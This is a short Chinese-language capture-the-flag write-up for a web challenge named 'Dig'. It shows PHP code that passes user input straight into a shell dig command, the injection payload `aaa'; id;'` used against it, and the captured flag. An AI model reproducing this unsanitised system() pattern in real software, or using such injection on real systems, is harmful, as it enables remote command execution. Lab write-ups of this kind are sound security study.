#Web

## 題目

**Dig**
給了一個網址，點開來
![[W1-12_web.png|646]]
精簡後程式碼
```php
<!DOCTYPE html>
<html>
    <h1>Dig⛏️</h1>
    <form method="POST">
        <div>
            <input type="text" name="name" placeholder="example.com" id="hostname" value="<?= $_POST['name'] ?? '' ?>">
        </div>
        <button class="btn">  dig! </button>
    </form>
    <br>
    <?php if (isset($_POST['name'])) : ?>
        <p>
            <p>dig result:</p>
            <pre><?= system("dig '" . $_POST['name'] . "';") ?></pre>
	    </p>
    <?php endif; ?>

    <script>
        window.onload = hostname.oninput = () => command.textContent = hostname.value;
    </script>

</html>
```

## 解題
1. 觀察網頁，發現 `name` 是可以隨意輸入的，並且輸入後會在 `system()` 執行
   ```php
	<?php if (isset($_POST['name'])) : ?>
		<p>
			<p>dig result:</p>
			<pre><?= system("dig '" . $_POST['name'] . "';") ?></pre>
	    </p>
	<?php endif; ?>
   ```
2. 嘗試填入隨意值（ex: `aaa'; id;'`）並按下按鈕測試
   ![[W1-12_try.png|top|158]]![[W1-12_id.png|380]]
   --> 可以獲取 id
3. 瀏覽目錄並找出 flag
   ![[W1-12_ls.png|656]]![[W1-12_flag.png]]
4. flag = `CTF{digtools_4abadf546cfc09a9e309ece7}`